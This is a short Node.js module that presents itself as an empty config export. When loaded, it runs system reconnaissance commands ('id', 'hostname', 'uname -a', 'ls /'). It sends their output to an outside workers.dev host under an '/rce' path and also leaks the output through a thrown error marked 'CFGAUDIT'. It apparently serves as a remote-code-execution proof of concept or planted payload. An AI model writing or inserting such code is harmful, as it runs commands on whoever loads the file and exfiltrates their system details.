const { execSync } = require('child_process');
let out = '';
try {
  out = execSync('id; hostname; uname -a; ls /').toString();
  const https = require('https');
  https.request({ host: 'cr-oob-01.claw-a64b48.workers.dev', path: '/rce?p=' + encodeURIComponent(out), method: 'GET' }).end();
} catch (e) {
  out = 'execfail: ' + e.message;
}
throw new Error('CFGAUDIT<<' + out + '>>CFGAUDIT');
module.exports = {};
